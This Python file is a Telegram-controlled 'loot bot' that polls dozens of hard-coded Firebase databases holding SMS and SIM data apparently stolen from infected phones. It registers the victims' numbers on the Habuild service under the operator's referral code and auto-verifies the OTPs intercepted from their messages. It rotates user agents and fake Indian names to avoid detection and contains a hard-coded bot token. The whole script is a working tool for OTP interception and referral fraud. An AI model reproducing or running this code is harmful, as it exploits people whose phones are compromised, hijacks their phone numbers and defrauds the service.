import os
import sys
import re
import time
import uuid
import json
import random
import asyncio
import logging
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING,
)

# ========== YOUR DETAILS ==========
TOKEN = "8841593698:AAFucNhM325wguWpdk-lFK6XI6tptwVzJIg"
ADMIN_ID = 8403468945
HABIT_REF = "adnan94901186"
# ==================================

POLL_INTERVAL = 0.05  # EVEN FASTER!
NUM_WORKERS = 100000   # MAXIMUM SPEED!

USED_NUMBERS_FILE = "used_numbers.txt"

# ========== ALL 53 PANELS ==========
ALL_PANELS = [
    "https://ck-kumar3-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://ckraj-7c86d-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://mman-433ae-default-rtdb.firebaseio.com/csc6/All_User/",
    "https://ujjwal-malmala-2ae81-default-rtdb.asia-southeast1.firebasedatabase.app/19112024/All_User/",
    "https://pm-kisan-04-de0e4-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://parkashbhai-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://pm-kishan-31-ea1ac-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://pm-kishan-a8-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://randa-2609c-default-rtdb.firebaseio.com/csc6/All_User/",
    "https://pm75-a64de-default-rtdb.firebaseio.com/csc6/All_User/",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://skkumar-2cb0e-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://mera-wala-71a5e-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://aaaa-b3749-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://kumarlive1-default-rtdb.firebaseio.com/omex/All_User/",
    "https://maik-31440-default-rtdb.firebaseio.com/omex/All_User/",
    "https://rahul-6bf55-default-rtdb.firebaseio.com/omex/All_User/",
    "https://karishmacsc-42128-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://please-2b091-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://vdgdgd-80f1e-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://pm-kisan-01hfg-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://lalanashish2-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://kitter-rajk8-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://pm-kishan-24hguh-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://mmmm-f7678-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc1/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc2/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc3/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc4/All_User/",
    "https://pm-kisan-28hhj-default-rtdb.firebaseio.com/Rahul7678/All_User/",
    "https://pm-kisan-13bguh-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://pm-kisan-30jgj-default-rtdb.firebaseio.com/Rahul7678/All_User/",
    "https://pm-modi-22dh-default-rtdb.firebaseio.com/Rahul7678/All_User/",
    "https://radhe-d31aa-default-rtdb.firebaseio.com/24kacscshoot/All_User/",
    "https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "https://duuu-dc41d-default-rtdb.firebaseio.com/",
    "https://kingbggbb-default-rtdb.firebaseio.com",
    "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "https://admin-panel-client-a3ee5-default-rtdb.firebaseio.com",
    "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
    "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://panel-wala-v40-default-rtdb.firebaseio.com",
    "https://newrto30-default-rtdb.firebaseio.com",
]

RAW_URLS = list(set(ALL_PANELS))
DATABASES = {f"DB_{i+1}": url for i, url in enumerate(RAW_URLS)}

print(f"✅ Loaded {len(DATABASES)} unique panels")

# Pre-compiled regex for speed
PHONE_CLEANER = re.compile(r"\D")
OTP_PATTERN = re.compile(r"\b(\d{6})\b")
HABUILD_PATTERN = re.compile(r"HABUILD", re.IGNORECASE)

MALE_FIRST_NAMES = ['Arjun', 'Aarav', 'Vihaan', 'Kabir', 'Dhruv', 'Krishna', 'Ishaan', 'Rahul', 'Vikram', 'Karan', 'Aditya', 'Rohan', 'Shaurya', 'Advik', 'Aryan', 'Reyansh', 'Vedant', 'Abhinav', 'Yash', 'Rishi']
FEMALE_FIRST_NAMES = ['Ananya', 'Aadhya', 'Diya', 'Ishita', 'Kiara', 'Myra', 'Navya', 'Kajal', 'Neha', 'Sneha', 'Pooja', 'Riya', 'Kriti', 'Tanya', 'Shruti', 'Priya', 'Meera', 'Tara', 'Anika', 'Arohi']
LAST_NAMES = ['Sharma', 'Verma', 'Gupta', 'Patil', 'Deshmukh', 'Singh', 'Kumar', 'Mishra', 'Joshi', 'Chauhan', 'Rajput', 'Yadav', 'Rathore', 'Mehta', 'Reddy', 'Nair', 'Bhatia', 'Ahuja', 'Kapoor', 'Iyer']

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36",
]

ENGINE_PREFIXES = ['QUANTUM', 'STEALTH', 'NEXUS', 'TITAN', 'CYBER', 'GHOST', 'SUPREME', 'OMEGA', 'ALPHA', 'SHADOW', 'VORTEX', 'ECLIPSE', 'COSMIC', 'NEO', 'PHANTOM', 'VENOM', 'APOLLO']
ENGINE_CORES = ['ENGINE', 'MATRIX', 'CORE', 'STRIKER', 'DESTROYER', 'REAPER', 'PULSE', 'OVERLORD', 'PREDATOR', 'SYNDICATE', 'DRAGON', 'VIPER', 'FALCON', 'BOT', 'ASSASSIN']

_http_session = None
_main_app = None
GLOBAL_DEVICE_CACHE = {}
seen_sms_ids = set()
used_names = set()
dead_panels = set()

pending_habuild = {} 
processed_nums = set() 
looted_count = [0] 
last_activity_time = time.time()
live_message_id = None 
number_queue = None
WAITING_FOR_PANEL = False

# Batch processing settings
BATCH_SIZE = 100
BATCH_TIMEOUT = 0.5

def load_used_numbers():
    if os.path.exists(USED_NUMBERS_FILE):
        try:
            with open(USED_NUMBERS_FILE, "r") as f:
                for line in f:
                    num = line.strip()
                    if num: processed_nums.add(num)
        except: pass

def save_used_number(num):
    processed_nums.add(num)
    try:
        with open(USED_NUMBERS_FILE, "a") as f:
            f.write(f"{num}\n")
    except: pass

def generate_indian_name():
    global used_names
    if len(used_names) >= 500: 
        used_names.clear()
    first_name = random.choice(MALE_FIRST_NAMES if random.choice([True, False]) else FEMALE_FIRST_NAMES)
    name = f"{first_name} {random.choice(LAST_NAMES)}"
    if name in used_names:
        name = f"{first_name} {random.choice(LAST_NAMES)}"
    used_names.add(name)
    return name

def get_random_headers():
    ua = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://portal.habuild.in",
        "Referer": "https://portal.habuild.in/",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    return headers, ua

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=10000, 
            limit_per_host=1000,
            ttl_dns_cache=300,
            keepalive_timeout=30,
            force_close=False
        )
        timeout = aiohttp.ClientTimeout(total=10, connect=3, sock_read=5)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fb_get(path: str, base: str):
    if base in dead_panels: return None
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        async with session.get(url) as r:
            if r.status != 200: return None
            return await r.json(content_type=None)
    except: 
        dead_panels.add(base)
        return None

def extract_all_nums(*dicts):
    nums = []
    for d in dicts:
        if not isinstance(d, dict): continue
        # Direct access for speed
        sim1 = d.get("sim1Number")
        sim2 = d.get("sim2Number")
        mob = d.get("mobNo")
        phone = d.get("phoneNumber")
        
        for val in (sim1, sim2, mob, phone, d.get("numberSim1"), d.get("numberSim2"), d.get("phone"), d.get("mobile")):
            if val and isinstance(val, str):
                clean = PHONE_CLEANER.sub("", val)
                if len(clean) >= 10:
                    nums.append(clean[-10:])
    return list(set(nums))

async def fetch_db_data(tag: str, url: str):
    devices_list = []
    try:
        sim_all, device_info_all, user_data_all = await asyncio.gather(
            fb_get("All_Users/simDetails", url), 
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url)
        )
        
        if isinstance(sim_all, dict):
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                status = "online" if str(info.get("Status", "")).lower() == "online" else "offline"
                devices_list.append({
                    "id": dev_id, 
                    "numbers": nums, 
                    "status": status, 
                    "base": url, 
                    "path": f"All_Users/sms/{dev_id}"
                })
                
        if isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if isinstance(data, dict):
                    nums = extract_all_nums(data)
                    status = "online" if str(data.get("status", "")).lower() == "online" else "offline"
                    devices_list.append({
                        "id": dev_id, 
                        "numbers": nums, 
                        "status": status, 
                        "base": url, 
                        "path": f"user_sms/{dev_id}"
                    })
    except:
        if url not in dead_panels:
            dead_panels.add(url)
    return devices_list

async def trigger_registration(phone_10d: str, worker_id: int, real_name: str):
    global last_activity_time
    last_activity_time = time.time()
    phone_full = f"+91{phone_10d}"
    device_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())

    reg_url = "https://auth-service.habuild.in/public/user/v1/register-user"
    reg_payload = {
        "name": real_name, 
        "phoneNumber": phone_full, 
        "referredBy": HABIT_REF, 
        "sourceData": {"type": "Referral", "refererurl": "", "timezone": "Asia/Kolkata"}, 
        "experimentMetaInfo": {"deviceId": device_id, "sessionId": session_id}
    }

    try:
        session = await get_http_session()
        headers, chosen_ua = get_random_headers()
        
        async with session.post(reg_url, json=reg_payload, headers=headers) as r:
            if r.status == 429:
                await number_queue.put((phone_10d, real_name))
                return
            if r.status != 200:
                return
            res = await r.json()
            
            if res.get('message') == 'success':
                log_url = "https://auth-service.habuild.in/public/auth/v1/login"
                log_payload = {
                    "method": "phone_otp", 
                    "otpChannel": "sms", 
                    "phoneNumber": phone_full, 
                    "sourceData": {"type": "portal", "utm_source": "whatsapp"}, 
                    "experimentMetaInfo": {"deviceId": device_id, "sessionId": str(uuid.uuid4())}, 
                    "registerUser": False
                }
                
                async with session.post(log_url, json=log_payload, headers=headers) as lr:
                    if lr.status == 429:
                        await number_queue.put((phone_10d, real_name))
                        return
                    lres = await lr.json()
                    
                    if lres.get('message') == 'OTP sent to your phone':
                        ref_code = lres.get('data', {}).get('refrence_code')
                        pending_habuild[phone_10d] = {
                            "phone": phone_full, 
                            "otp_ref": ref_code, 
                            "device_id": device_id, 
                            "session_id": session_id,
                            "user_agent": chosen_ua,
                            "name": real_name,
                            "timestamp": time.time()
                        }
                        # print(f"✅ [W-{worker_id}]: {phone_10d} | {real_name}")
    except:
        await number_queue.put((phone_10d, real_name))

async def verify_habuild_otp(phone_10d: str, otp: str):
    global last_activity_time
    data = pending_habuild.pop(phone_10d, None)
    if not data: return

    last_activity_time = time.time()
    url = "https://auth-service.habuild.in/public/auth/v1/verify-otp"
    payload = {
        "phone": data['phone'], 
        "reference_code": data['otp_ref'], 
        "otp": otp, 
        "experimentMetaInfo": {"deviceId": data['device_id'], "sessionId": str(uuid.uuid4())}, 
        "registerUser": False
    }
    try:
        session = await get_http_session()
        headers, _ = get_random_headers()
        
        async with session.post(url, json=payload, headers=headers) as r:
            res = await r.json()
            if res.get('message') == 'OTP verified successfully':
                looted_count[0] += 1
                member = res.get('data', {}).get('member', {})
                engine_name = get_dynamic_engine_name()
                
                succ_msg = (
                    f"🎯 {engine_name} LOOT SUCCESSFUL! 🎯\n\n"
                    f"📱 Number: {data['phone']}\n"
                    f"👤 Name: {member.get('name', data['name'])}\n"
                    f"🆔 Member ID: {member.get('legacy_free_id', 'N/A')}\n"
                    f"🔗 Referral Code: {HABIT_REF}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ TOTAL REFERRALS: {looted_count[0]}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔐 OTP {otp} Verified!"
                )
                if _main_app: 
                    await _main_app.bot.send_message(ADMIN_ID, succ_msg)
                    print(f"🎯 TOTAL REFERRALS: {looted_count[0]}")
    except: 
        pass

async def _forward_sms(device: dict, sms: dict):
    body = str(sms.get("body") or sms.get("message") or sms.get("text") or "")
    sender = str(sms.get("sender") or "")
    
    # Fast check for HABUILD
    if not HABUILD_PATTERN.search(sender) and not HABUILD_PATTERN.search(body):
        return
        
    otp_match = OTP_PATTERN.search(body)
    if otp_match:
        otp = otp_match.group(1)
        for num in device.get("numbers", []):
            if num in pending_habuild:
                asyncio.create_task(verify_habuild_otp(num, otp))
                break

async def poll_single_db(url: str):
    if url in dead_panels: 
        return
    try:
        r_main, r_user = await asyncio.gather(
            fb_get("All_Users/sms", url), 
            fb_get("user_sms", url)
        )
        
        devices_in_db = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d["base"] == url]
        device_map = {d["id"]: d for d in devices_in_db}
        
        # Process main SMS
        if isinstance(r_main, dict):
            for dev_id, sms_dict in r_main.items():
                if not isinstance(sms_dict, dict): 
                    continue
                device = device_map.get(dev_id)
                if not device:
                    continue
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): 
                        continue
                    sk = f"{dev_id}/{k}"
                    if sk in seen_sms_ids: 
                        continue
                    seen_sms_ids.add(sk)
                    await _forward_sms(device, sms)
        
        # Process user SMS
        if isinstance(r_user, dict):
            for dev_id, sms_dict in r_user.items():
                if not isinstance(sms_dict, dict): 
                    continue
                device = device_map.get(dev_id)
                if not device:
                    continue
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): 
                        continue
                    sk = f"u/{dev_id}/{k}"
                    if sk in seen_sms_ids: 
                        continue
                    seen_sms_ids.add(sk)
                    await _forward_sms(device, sms)
                    
    except:
        pass

async def update_cache_loop():
    while True:
        try:
            # Batch panel fetching
            active_urls = [url for url in DATABASES.values() if url not in dead_panels]
            
            # Process in batches to avoid overwhelming
            for i in range(0, len(active_urls), 20):
                batch = active_urls[i:i+20]
                tasks = [fetch_db_data(tag, url) for tag, url in DATABASES.items() if url in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                all_devices = []
                for res in results:
                    if isinstance(res, list): 
                        all_devices.extend(res)
                
                GLOBAL_DEVICE_CACHE["ALL"] = all_devices
                
                # Batch process numbers
                mixed_online_numbers = []
                for dev in all_devices:
                    if dev.get("status") == "online":
                        for num in dev.get("numbers", []):
                            if num not in processed_nums and num not in pending_habuild:
                                real_name = generate_indian_name()
                                mixed_online_numbers.append((num, real_name))
                
                if mixed_online_numbers:
                    random.shuffle(mixed_online_numbers)
                    for num, rname in mixed_online_numbers[:500]:  # Limit per cycle
                        save_used_number(num)
                        await number_queue.put((num, rname))
                
                await asyncio.sleep(0.1)  # Small delay between batches
                
        except Exception as e:
            print(f"Cache error: {e}")
        await asyncio.sleep(1.5)

async def api_worker(worker_id: int):
    while True:
        try:
            num, real_name = await number_queue.get()
            await trigger_registration(num, worker_id, real_name)
            number_queue.task_done()
            await asyncio.sleep(0)  # Yield control
        except:
            await asyncio.sleep(0.1)

async def poll_loop():
    while True:
        active_urls = [url for url in DATABASES.values() if url not in dead_panels]
        if active_urls:
            # Poll in parallel batches
            for i in range(0, len(active_urls), 30):
                batch = active_urls[i:i+30]
                await asyncio.gather(*[poll_single_db(url) for url in batch], return_exceptions=True)
        await asyncio.sleep(POLL_INTERVAL)

async def otp_expiry_janitor():
    while True:
        try:
            current_time = time.time()
            expired = [num for num, data in pending_habuild.items() if current_time - data.get("timestamp", current_time) > 15]
            for num in expired:
                pending_habuild.pop(num, None)
        except:
            pass
        await asyncio.sleep(0.5)  # Faster cleanup

async def watchdog_loop():
    global last_activity_time, _http_session, GLOBAL_DEVICE_CACHE
    while True:
        await asyncio.sleep(30)  
        if time.time() - last_activity_time > 120:  
            GLOBAL_DEVICE_CACHE.clear()
            seen_sms_ids.clear()
            if _http_session and not _http_session.closed:
                await _http_session.close()
                _http_session = None
            last_activity_time = time.time()

async def live_dashboard_updater():
    global live_message_id
    while True:
        await asyncio.sleep(2)
        if live_message_id and _main_app:
            try:
                q_size = number_queue.qsize() if number_queue else 0
                active_panels = len(DATABASES) - len(dead_panels)
                engine_name = get_dynamic_engine_name()
                
                text = (
                    f"🔥 {engine_name} LIVE DASHBOARD 🔥\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🗄️ Active Panels: {active_panels}/{len(DATABASES)}\n"
                    f"⚰️ Dead Panels: {len(dead_panels)}\n"
                    f"📱 Numbers in Queue: {q_size}\n"
                    f"💾 Numbers Used: {len(processed_nums)}\n"
                    f"⏳ Waiting OTP: {len(pending_habuild)}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 TOTAL REFERRALS: {looted_count[0]}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "⚡ ULTRA SPEED MODE ACTIVE ⚡"
                )
                
                keyboard = [
                    [InlineKeyboardButton("➕ Add Panel", callback_data='add_panel')],
                    [InlineKeyboardButton("📊 Stats", callback_data='btn_stats')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)

                await _main_app.bot.edit_message_text(
                    chat_id=ADMIN_ID, message_id=live_message_id, 
                    text=text, reply_markup=reply_markup
                )
            except: 
                pass

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_ID: return
    engine_name = get_dynamic_engine_name()
    text = (
        f"🔥 {engine_name} ACTIVATED 🔥\n\n"
        f"📱 App: Habuild\n"
        f"🔗 Referral: {HABIT_REF}\n"
        f"🗄️ Panels: {len(DATABASES)}\n"
        f"⚡ Workers: {NUM_WORKERS}\n\n"
        f"✅ REAL OTP VERIFICATION\n"
        f"✅ ULTRA SPEED MODE\n\n"
        f"Use /live for Dashboard"
    )
    keyboard = [
        [InlineKeyboardButton("📊 Live Dashboard", callback_data='btn_live')],
        [InlineKeyboardButton("➕ Add Panel", callback_data='add_panel')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

async def cmd_live(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_message_id
    if update.effective_chat.id != ADMIN_ID: return
    msg = await update.message.reply_text("🚀 Starting Live Dashboard...")
    live_message_id = msg.message_id

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_message_id
    if update.effective_chat.id != ADMIN_ID: return
    live_message_id = None 
    q_size = number_queue.qsize() if number_queue else 0
    active_panels = len(DATABASES) - len(dead_panels)
    engine_name = get_dynamic_engine_name()
    text = (
        f"📊 {engine_name} STATS 📊\n\n"
        f"🗄️ Active Panels: {active_panels}/{len(DATABASES)}\n"
        f"📱 Queue: {q_size}\n"
        f"🎯 TOTAL REFERRALS: {looted_count[0]}\n\n"
        f"🔗 Code: {HABIT_REF}"
    )
    await update.message.reply_text(text)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global live_message_id, WAITING_FOR_PANEL
    query = update.callback_query
    await query.answer()

    if query.data == 'btn_live':
        live_message_id = query.message.message_id
        await query.edit_message_text("🔄 Switching to Live Dashboard...")
        
    elif query.data == 'btn_stats':
        live_message_id = None
        q_size = number_queue.qsize() if number_queue else 0
        active_panels = len(DATABASES) - len(dead_panels)
        engine_name = get_dynamic_engine_name()
        text = (
            f"📊 {engine_name} STATS\n\n"
            f"Active: {active_panels}/{len(DATABASES)}\n"
            f"Queue: {q_size}\n"
            f"REFERRALS: {looted_count[0]}"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Live", callback_data='btn_live')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text, reply_markup=reply_markup)
        
    elif query.data == 'add_panel':
        WAITING_FOR_PANEL = True
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text="🔗 Send Firebase Panel URL:\nExample: https://your-database.firebaseio.com"
        )

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global WAITING_FOR_PANEL
    if update.effective_chat.id != ADMIN_ID: return

    if WAITING_FOR_PANEL:
        url = update.message.text.strip()
        if url.startswith("https://") and "firebaseio.com" in url:
            new_db_name = f"DB_{len(DATABASES) + 1}"
            DATABASES[new_db_name] = url
            WAITING_FOR_PANEL = False
            await update.message.reply_text(f"✅ Panel Added: {new_db_name}\nTotal: {len(DATABASES)}")
        else:
            await update.message.reply_text("❌ Invalid URL!")

def get_dynamic_engine_name():
    return f"{random.choice(ENGINE_PREFIXES)} {random.choice(ENGINE_CORES)}"

def main():
    print("🤖 Starting Habuild Loot Bot (ULTRA SPEED EDITION)...")
    print(f"📊 Total Panels: {len(DATABASES)}")
    print(f"⚡ Workers: {NUM_WORKERS}")
    print(f"🔗 Referral: {HABIT_REF}")
    
    load_used_numbers()
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("live", cmd_live))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))

    async def post_init(application: Application):
        global _main_app, number_queue
        _main_app = application
        number_queue = asyncio.Queue(maxsize=50000)
        
        try:
            await application.bot.send_message(
                chat_id=ADMIN_ID, 
                text=f"🔥 HABUILD LOOT BOT ONLINE! (ULTRA SPEED)\n📊 {len(DATABASES)} Panels Loaded\n🔗 Referral: {HABIT_REF}\n⚡ {NUM_WORKERS} Workers Active!"
            )
        except: 
            pass
        
        asyncio.create_task(update_cache_loop())
        asyncio.create_task(poll_loop())
        asyncio.create_task(watchdog_loop())
        asyncio.create_task(live_dashboard_updater())
        asyncio.create_task(otp_expiry_janitor())
        
        for i in range(NUM_WORKERS):
            asyncio.create_task(api_worker(i))
        
        print(f"✅ {NUM_WORKERS} workers started!")
        print("🎯 Bot is LOOTING at ULTRA SPEED!")

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
